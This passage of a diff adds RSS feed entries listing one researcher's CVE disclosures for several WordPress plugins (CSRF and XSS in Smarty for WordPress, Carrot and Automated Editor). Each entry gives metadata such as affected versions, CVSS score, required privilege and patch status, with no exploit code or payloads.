+    &lt;a href=&#34;#vulnerability--cross-site-request-forgery-csrf&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;Logged-in users can be tricked into performing actions they didn&amp;rsquo;t intend, like changing passwords or making purchases.&lt;/p&gt;
+&lt;p&gt;CVSS score is a way to evaluate and rank reported vulnerabilities in a standardized and repeatable way but which is not ideal for WordPress.&lt;/p&gt;
+&lt;h4&gt;Details : User Interaction Required&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;details--user-interaction-required&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#details--user-interaction-required&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;While this vulnerability can be initiated by the role shown in &amp;ldquo;Required Privilege&amp;rdquo;, successful exploitation requires a privileged user to perform an action — such as clicking a malicious link, visiting a crafted page, or submitting a form.&lt;/p&gt;
+&lt;table&gt;
+	&lt;thead&gt;
+			&lt;tr&gt;
+					&lt;th&gt;Title&lt;/th&gt;
+					&lt;th&gt;WordPress Smarty for WordPress Plugin &amp;lt;= 3.1.35 is vulnerable to Cross Site Request Forgery (CSRF)&lt;/th&gt;
+			&lt;/tr&gt;
+	&lt;/thead&gt;
+	&lt;tbody&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Vulnerable Versions&lt;/td&gt;
+					&lt;td&gt;&amp;lt;= 3.1.35&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Risk&lt;/td&gt;
+					&lt;td&gt;CVSS 5.4&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Vulnerability&lt;/td&gt;
+					&lt;td&gt;&lt;strong&gt;Cross Site Request Forgery:&lt;/strong&gt; Logged-in users can be tricked into performing actions they didn&amp;rsquo;t intend, like changing passwords or making purchases.&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Software&lt;/td&gt;
+					&lt;td&gt;Smarty for WordPress&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Type&lt;/td&gt;
+					&lt;td&gt;Plugin&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Vulnerable versions&lt;/td&gt;
+					&lt;td&gt;&amp;lt;= 3.1.35&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Patched in&lt;/td&gt;
+					&lt;td&gt;No official patch available&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;OWASP Top 10&lt;/td&gt;
+					&lt;td&gt;A5: Broken Access Control&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Classification&lt;/td&gt;
+					&lt;td&gt;Cross Site Request Forgery (CSRF)&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;CVE ID&lt;/td&gt;
+					&lt;td&gt;&lt;a
+    href=&#34;https://www.cve.org/CVERecord?id=CVE-2023-37992&#34;target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CVE-2023-37992&lt;/a&gt;&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Patchstack priority&lt;/td&gt;
+					&lt;td&gt;🟢Low&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;CVSS severity&lt;/td&gt;
+					&lt;td&gt;5.4&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Required privilege&lt;/td&gt;
+					&lt;td&gt;Unauthenticated&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;PSID&lt;/td&gt;
+					&lt;td&gt;61374bdcfc42&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Credits&lt;/td&gt;
+					&lt;td&gt;Prasanna V Balaji&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Published&lt;/td&gt;
+					&lt;td&gt;19 Jul, 2023&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Reported by&lt;/td&gt;
+					&lt;td&gt;&lt;a
+    href=&#34;https://patchstack.com/database/researchers/749f2e1d-43ee-4906-8e67-5676b999c89e&#34;target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Prasanna V Balaji&lt;/a&gt;&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Date&lt;/td&gt;
+					&lt;td&gt;2 Feb, 2023&lt;/td&gt;
+			&lt;/tr&gt;
+	&lt;/tbody&gt;
+&lt;/table&gt;
+
+      </description>
+    </item>
+    
+    <item>
+      <title>CVE-2023-40328</title>
+      <link>http://localhost:1313/docs/07_research/06-cve-2023-40328/</link>
+      <pubDate>Sat, 21 Nov 2026 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/docs/07_research/06-cve-2023-40328/</guid>
+      <description>
+        
+        
+        &lt;div style=&#34;margin-top: 1rem; margin-bottom: 2rem; font-size: 0.875rem; color: #6b7280; display: flex; align-items: center; flex-wrap: wrap; gap: 10px;&#34;&gt;
+  
+    &lt;span style=&#34;display: flex; align-items: center; gap: 6px;&#34;&gt;
+      By:
+      
+        
+        
+        
+        
+          
+          
+          
+            
+          
+          
+          &lt;a href=&#34;https://www.linkedin.com/in/prasannavbalaji&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34; style=&#34;display: inline-flex; align-items: center; gap: 4px; font-weight: 600; color: #0a66c2; text-decoration: none; border-bottom: 1px solid transparent;&#34; onmouseover=&#34;this.style.borderBottom=&#39;1px solid #0a66c2&#39;&#34; onmouseout=&#34;this.style.borderBottom=&#39;1px solid transparent&#39;&#34;&gt;
+            &lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; width=&#34;14&#34; height=&#34;14&#34; viewBox=&#34;0 0 24 24&#34; fill=&#34;currentColor&#34;&gt;
+                &lt;path d=&#34;M19 0h-14c-2.761 0-5 2.239-5 5v14c0 2.761 2.239 5 5 5h14c2.762 0 5-2.239 5-5v-14c0-2.761-2.238-5-5-5zm-11 19h-3v-11h3v11zm-1.5-12.268c-.966 0-1.75-.79-1.75-1.764s.784-1.764 1.75-1.764 1.75.79 1.75 1.764-.783 1.764-1.75 1.764zm13.5 12.268h-3v-5.604c0-3.368-4-3.113-4 0v5.604h-3v-11h3v1.765c1.396-2.586 7-2.777 7 2.476v6.759z&#34;/&gt;
+            &lt;/svg&gt;
+            Prasanna
+          &lt;/a&gt;
+        
+      
+    &lt;/span&gt;
+  
+
+  
+    &lt;span style=&#34;color: #d1d5db;&#34;&gt;|&lt;/span&gt;
+    &lt;time style=&#34;font-style: italic;&#34;&gt;November 21, 2026&lt;/time&gt;
+  
+&lt;/div&gt;
+&lt;h4&gt;Vulnerability : Cross Site Scripting (XSS)&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;vulnerability--cross-site-scripting-xss&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#vulnerability--cross-site-scripting-xss&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;Attackers can inject malicious scripts into the site that steal visitor data or hijack their accounts.&lt;/p&gt;
+&lt;p&gt;CVSS score is a way to evaluate and rank reported vulnerabilities in a standardized and repeatable way but which is not ideal for WordPress.&lt;/p&gt;
+&lt;h4&gt;Details : User Interaction Required&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;details--user-interaction-required&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#details--user-interaction-required&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;While this vulnerability can be initiated by the role shown in &amp;ldquo;Required Privilege&amp;rdquo;, successful exploitation requires a privileged user to perform an action — such as clicking a malicious link, visiting a crafted page, or submitting a form.&lt;/p&gt;
+&lt;table&gt;
+	&lt;thead&gt;
+			&lt;tr&gt;
+					&lt;th&gt;Title&lt;/th&gt;
+					&lt;th&gt;WordPress Carrot Plugin &amp;lt;= 1.1.0 is vulnerable to Cross Site Scripting (XSS)&lt;/th&gt;
+			&lt;/tr&gt;
+	&lt;/thead&gt;
+	&lt;tbody&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Vulnerable Versions&lt;/td&gt;
+					&lt;td&gt;&amp;lt;= 1.1.0&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Risk&lt;/td&gt;
+					&lt;td&gt;CVSS 5.9&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Vulnerability&lt;/td&gt;
+					&lt;td&gt;&lt;strong&gt;Cross Site Scripting (XSS):&lt;/strong&gt; Attackers can inject malicious scripts into the site that steal visitor data or hijack their accounts.&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Software&lt;/td&gt;
+					&lt;td&gt;Carrot&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Type&lt;/td&gt;
+					&lt;td&gt;Plugin&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Vulnerable versions&lt;/td&gt;
+					&lt;td&gt;&amp;lt;= 1.1.0&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Patched in&lt;/td&gt;
+					&lt;td&gt;No official patch available&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;OWASP Top 10&lt;/td&gt;
+					&lt;td&gt;A7: Cross-Site Scripting (XSS)&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Classification&lt;/td&gt;
+					&lt;td&gt;Cross Site Scripting (XSS)&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;CVE ID&lt;/td&gt;
+					&lt;td&gt;&lt;a
+    href=&#34;https://www.cve.org/CVERecord?id=CVE-2023-40328&#34;target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CVE-2023-40328&lt;/a&gt;&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Patchstack priority&lt;/td&gt;
+					&lt;td&gt;🟢Low&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;CVSS severity&lt;/td&gt;
+					&lt;td&gt;5.9&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Required privilege&lt;/td&gt;
+					&lt;td&gt;Administrator&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;PSID&lt;/td&gt;
+					&lt;td&gt;4994efcb84ef&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Credits&lt;/td&gt;
+					&lt;td&gt;Prasanna V Balaji&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Published&lt;/td&gt;
+					&lt;td&gt;16 Aug, 2023&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Reported by&lt;/td&gt;
+					&lt;td&gt;&lt;a
+    href=&#34;https://patchstack.com/database/researchers/749f2e1d-43ee-4906-8e67-5676b999c89e&#34;target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Prasanna V Balaji&lt;/a&gt;&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Date&lt;/td&gt;
+					&lt;td&gt;8 Feb, 2023&lt;/td&gt;
+			&lt;/tr&gt;
+	&lt;/tbody&gt;
+&lt;/table&gt;
+
+      </description>
+    </item>
+    
+    <item>
+      <title>CVE-2023-41661</title>
+      <link>http://localhost:1313/docs/07_research/05-cve-2023-41661/</link>
+      <pubDate>Sat, 21 Nov 2026 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/docs/07_research/05-cve-2023-41661/</guid>
+      <description>
+        
+        
+        &lt;div style=&#34;margin-top: 1rem; margin-bottom: 2rem; font-size: 0.875rem; color: #6b7280; display: flex; align-items: center; flex-wrap: wrap; gap: 10px;&#34;&gt;
+  
+    &lt;span style=&#34;display: flex; align-items: center; gap: 6px;&#34;&gt;
+      By:
+      
+        
+        
+        
+        
+          
+          
+          
+            
+          
+          
+          &lt;a href=&#34;https://www.linkedin.com/in/prasannavbalaji&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34; style=&#34;display: inline-flex; align-items: center; gap: 4px; font-weight: 600; color: #0a66c2; text-decoration: none; border-bottom: 1px solid transparent;&#34; onmouseover=&#34;this.style.borderBottom=&#39;1px solid #0a66c2&#39;&#34; onmouseout=&#34;this.style.borderBottom=&#39;1px solid transparent&#39;&#34;&gt;
+            &lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; width=&#34;14&#34; height=&#34;14&#34; viewBox=&#34;0 0 24 24&#34; fill=&#34;currentColor&#34;&gt;
+                &lt;path d=&#34;M19 0h-14c-2.761 0-5 2.239-5 5v14c0 2.761 2.239 5 5 5h14c2.762 0 5-2.239 5-5v-14c0-2.761-2.238-5-5-5zm-11 19h-3v-11h3v11zm-1.5-12.268c-.966 0-1.75-.79-1.75-1.764s.784-1.764 1.75-1.764 1.75.79 1.75 1.764-.783 1.764-1.75 1.764zm13.5 12.268h-3v-5.604c0-3.368-4-3.113-4 0v5.604h-3v-11h3v1.765c1.396-2.586 7-2.777 7 2.476v6.759z&#34;/&gt;
+            &lt;/svg&gt;
+            Prasanna
+          &lt;/a&gt;
+        
+      
+    &lt;/span&gt;
+  
+
+  
+    &lt;span style=&#34;color: #d1d5db;&#34;&gt;|&lt;/span&gt;
+    &lt;time style=&#34;font-style: italic;&#34;&gt;November 21, 2026&lt;/time&gt;
+  
+&lt;/div&gt;
+&lt;h4&gt;Vulnerability : Cross Site Scripting (XSS)&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;vulnerability--cross-site-scripting-xss&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#vulnerability--cross-site-scripting-xss&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;Attackers can inject malicious scripts into the site that steal visitor data or hijack their accounts.&lt;/p&gt;
+&lt;p&gt;CVSS score is a way to evaluate and rank reported vulnerabilities in a standardized and repeatable way but which is not ideal for WordPress.&lt;/p&gt;
+&lt;h4&gt;Details : User Interaction Required&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;details--user-interaction-required&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#details--user-interaction-required&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;While this vulnerability can be initiated by the role shown in &amp;ldquo;Required Privilege&amp;rdquo;, successful exploitation requires a privileged user to perform an action — such as clicking a malicious link, visiting a crafted page, or submitting a form.&lt;/p&gt;
+&lt;table&gt;
+	&lt;thead&gt;
+			&lt;tr&gt;
+					&lt;th&gt;Title&lt;/th&gt;
+					&lt;th&gt;WordPress Smarty for WordPress Plugin &amp;lt;= 3.1.35 is vulnerable to Cross Site Scripting (XSS)&lt;/th&gt;
+			&lt;/tr&gt;
+	&lt;/thead&gt;
+	&lt;tbody&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Vulnerable Versions&lt;/td&gt;
+					&lt;td&gt;&amp;lt;= 3.1.35&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Risk&lt;/td&gt;
+					&lt;td&gt;CVSS 5.9&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Vulnerability&lt;/td&gt;
+					&lt;td&gt;&lt;strong&gt;Cross Site Scripting (XSS):&lt;/strong&gt; Attackers can inject malicious scripts into the site that steal visitor data or hijack their accounts.&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Software&lt;/td&gt;
+					&lt;td&gt;Smarty for WordPress&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Type&lt;/td&gt;
+					&lt;td&gt;Plugin&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Vulnerable versions&lt;/td&gt;
+					&lt;td&gt;&amp;lt;= 3.1.35&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Patched in&lt;/td&gt;
+					&lt;td&gt;No official patch available&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;OWASP Top 10&lt;/td&gt;
+					&lt;td&gt;A7: Cross-Site Scripting (XSS)&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Classification&lt;/td&gt;
+					&lt;td&gt;Cross Site Scripting (XSS)&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;CVE ID&lt;/td&gt;
+					&lt;td&gt;&lt;a
+    href=&#34;https://www.cve.org/CVERecord?id=CVE-2023-41661&#34;target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CVE-2023-41661&lt;/a&gt;&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Patchstack priority&lt;/td&gt;
+					&lt;td&gt;🟢Low&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;CVSS severity&lt;/td&gt;
+					&lt;td&gt;5.9&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Required privilege&lt;/td&gt;
+					&lt;td&gt;Administrator&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;PSID&lt;/td&gt;
+					&lt;td&gt;3df7564a9cc9&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Credits&lt;/td&gt;
+					&lt;td&gt;Prasanna V Balaji&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Published&lt;/td&gt;
+					&lt;td&gt;1 Sep, 2023&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Reported by&lt;/td&gt;
+					&lt;td&gt;&lt;a
+    href=&#34;https://patchstack.com/database/researchers/749f2e1d-43ee-4906-8e67-5676b999c89e&#34;target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Prasanna V Balaji&lt;/a&gt;&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Date&lt;/td&gt;
+					&lt;td&gt;2 Feb, 2023&lt;/td&gt;
+			&lt;/tr&gt;
+	&lt;/tbody&gt;
+&lt;/table&gt;
+
+      </description>
+    </item>
+    
+    <item>
+      <title>CVE-2023-45276</title>
+      <link>http://localhost:1313/docs/07_research/03-cve-2023-45276/</link>
+      <pubDate>Sat, 21 Nov 2026 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/docs/07_research/03-cve-2023-45276/</guid>
+      <description>
+        
+        
+        &lt;div style=&#34;margin-top: 1rem; margin-bottom: 2rem; font-size: 0.875rem; color: #6b7280; display: flex; align-items: center; flex-wrap: wrap; gap: 10px;&#34;&gt;
+  
+    &lt;span style=&#34;display: flex; align-items: center; gap: 6px;&#34;&gt;
+      By:
+      
+        
+        
+        
+        
+          
+          
+          
+            
+          
+          
+          &lt;a href=&#34;https://www.linkedin.com/in/prasannavbalaji&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34; style=&#34;display: inline-flex; align-items: center; gap: 4px; font-weight: 600; color: #0a66c2; text-decoration: none; border-bottom: 1px solid transparent;&#34; onmouseover=&#34;this.style.borderBottom=&#39;1px solid #0a66c2&#39;&#34; onmouseout=&#34;this.style.borderBottom=&#39;1px solid transparent&#39;&#34;&gt;
+            &lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; width=&#34;14&#34; height=&#34;14&#34; viewBox=&#34;0 0 24 24&#34; fill=&#34;currentColor&#34;&gt;
+                &lt;path d=&#34;M19 0h-14c-2.761 0-5 2.239-5 5v14c0 2.761 2.239 5 5 5h14c2.762 0 5-2.239 5-5v-14c0-2.761-2.238-5-5-5zm-11 19h-3v-11h3v11zm-1.5-12.268c-.966 0-1.75-.79-1.75-1.764s.784-1.764 1.75-1.764 1.75.79 1.75 1.764-.783 1.764-1.75 1.764zm13.5 12.268h-3v-5.604c0-3.368-4-3.113-4 0v5.604h-3v-11h3v1.765c1.396-2.586 7-2.777 7 2.476v6.759z&#34;/&gt;
+            &lt;/svg&gt;
+            Prasanna
+          &lt;/a&gt;
+        
+      
+    &lt;/span&gt;
+  
+
+  
+    &lt;span style=&#34;color: #d1d5db;&#34;&gt;|&lt;/span&gt;
+    &lt;time style=&#34;font-style: italic;&#34;&gt;November 21, 2026&lt;/time&gt;
+  
+&lt;/div&gt;
+&lt;h4&gt;Vulnerability : Cross Site Request Forgery (CSRF)&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;vulnerability--cross-site-request-forgery-csrf&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#vulnerability--cross-site-request-forgery-csrf&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;Logged-in users can be tricked into performing actions they didn&amp;rsquo;t intend, like changing passwords or making purchases.&lt;/p&gt;
+&lt;p&gt;CVSS score is a way to evaluate and rank reported vulnerabilities in a standardized and repeatable way but which is not ideal for WordPress.&lt;/p&gt;
+&lt;h4&gt;Details : User Interaction Required&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;details--user-interaction-required&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#details--user-interaction-required&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;While this vulnerability can be initiated by the role shown in &amp;ldquo;Required Privilege&amp;rdquo;, successful exploitation requires a privileged user to perform an action — such as clicking a malicious link, visiting a crafted page, or submitting a form.&lt;/p&gt;
+&lt;table&gt;
+	&lt;thead&gt;
+			&lt;tr&gt;
+					&lt;th&gt;Title&lt;/th&gt;
+					&lt;th&gt;WordPress Automated Editor Plugin &amp;lt;= 1.3 is vulnerable to Cross Site Request Forgery (CSRF)&lt;/th&gt;
+			&lt;/tr&gt;
+	&lt;/thead&gt;
+	&lt;tbody&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Vulnerable Versions&lt;/td&gt;
+					&lt;td&gt;&amp;lt;= 1.3&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Risk&lt;/td&gt;
+					&lt;td&gt;CVSS 5.4&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Vulnerability&lt;/td&gt;
+					&lt;td&gt;&lt;strong&gt;Cross Site Request Forgery:&lt;/strong&gt; Logged-in users can be tricked into performing actions they didn&amp;rsquo;t intend, like changing passwords or making purchases.&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Software&lt;/td&gt;
+					&lt;td&gt;Automated Editor&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Type&lt;/td&gt;
+					&lt;td&gt;Plugin&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Vulnerable versions&lt;/td&gt;
+					&lt;td&gt;&amp;lt;= 1.3&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Patched in&lt;/td&gt;
+					&lt;td&gt;No official patch available&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;OWASP Top 10&lt;/td&gt;
+					&lt;td&gt;A5: Broken Access Control&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Classification&lt;/td&gt;
+					&lt;td&gt;Cross Site Request Forgery (CSRF)&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;CVE ID&lt;/td&gt;
+					&lt;td&gt;&lt;a
+    href=&#34;https://www.cve.org/CVERecord?id=CVE-2023-45276&#34;target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CVE-2023-45276&lt;/a&gt;&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Patchstack priority&lt;/td&gt;
+					&lt;td&gt;🟢Low&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;CVSS severity&lt;/td&gt;
+					&lt;td&gt;5.4&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Required privilege&lt;/td&gt;
+					&lt;td&gt;Unauthenticated&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;PSID&lt;/td&gt;
+					&lt;td&gt;cc623180e80f&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Credits&lt;/td&gt;
+					&lt;td&gt;Prasanna V Balaji&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Published&lt;/td&gt;
+					&lt;td&gt;6 Oct, 2023&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Reported by&lt;/td&gt;
+					&lt;td&gt;&lt;a
+    href=&#34;https://patchstack.com/database/researchers/749f2e1d-43ee-4906-8e67-5676b999c89e&#34;target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Prasanna V Balaji&lt;/a&gt;&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Date&lt;/td&gt;
+					&lt;td&gt;26 Feb, 2023&lt;/td&gt;
+			&lt;/tr&gt;
+	&lt;/tbody&gt;
+&lt;/table&gt;
+
+      </description>
+    </item>
+    
+    <item>
+      <title>CVE-2023-45641</title>
+      <link>http://localhost:1313/docs/07_research/02-cve-2023-45641/</link>
+      <pubDate>Sat, 21 Nov 2026 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/docs/07_research/02-cve-2023-45641/</guid>
+      <description>
+        
+        
+        &lt;div style=&#34;margin-top: 1rem; margin-bottom: 2rem; font-size: 0.875rem; color: #6b7280; display: flex; align-items: center; flex-wrap: wrap; gap: 10px;&#34;&gt;
+  
+    &lt;span style=&#34;display: flex; align-items: center; gap: 6px;&#34;&gt;
+      By:
+      
+        
+        
+        
+        
+          
+          
+          
+            
+          
+          
+          &lt;a href=&#34;https://www.linkedin.com/in/prasannavbalaji&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34; style=&#34;display: inline-flex; align-items: center; gap: 4px; font-weight: 600; color: #0a66c2; text-decoration: none; border-bottom: 1px solid transparent;&#34; onmouseover=&#34;this.style.borderBottom=&#39;1px solid #0a66c2&#39;&#34; onmouseout=&#34;this.style.borderBottom=&#39;1px solid transparent&#39;&#34;&gt;
+            &lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; width=&#34;14&#34; height=&#34;14&#34; viewBox=&#34;0 0 24 24&#34; fill=&#34;currentColor&#34;&gt;
+                &lt;path d=&#34;M19 0h-14c-2.761 0-5 2.239-5 5v14c0 2.761 2.239 5 5 5h14c2.762 0 5-2.239 5-5v-14c0-2.761-2.238-5-5-5zm-11 19h-3v-11h3v11zm-1.5-12.268c-.966 0-1.75-.79-1.75-1.764s.784-1.764 1.75-1.764 1.75.79 1.75 1.764-.783 1.764-1.75 1.764zm13.5 12.268h-3v-5.604c0-3.368-4-3.113-4 0v5.604h-3v-11h3v1.765c1.396-2.586 7-2.777 7 2.476v6.759z&#34;/&gt;
+            &lt;/svg&gt;
+            Prasanna
+          &lt;/a&gt;
+        
+      
+    &lt;/span&gt;
+  
+
+  
+    &lt;span style=&#34;color: #d1d5db;&#34;&gt;|&lt;/span&gt;
+    &lt;time style=&#34;font-style: italic;&#34;&gt;November 21, 2026&lt;/time&gt;
+  
+&lt;/div&gt;
+&lt;h4&gt;Vulnerability : Cross Site Request Forgery (CSRF)&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;vulnerability--cross-site-request-forgery-csrf&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#vulnerability--cross-site-request-forgery-csrf&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;Logged-in users can be tricked into performing actions they didn&amp;rsquo;t intend, like changing passwords or making purchases.&lt;/p&gt;
+&lt;p&gt;CVSS score is a way to evaluate and rank reported vulnerabilities in a standardized and repeatable way but which is not ideal for WordPress.&lt;/p&gt;
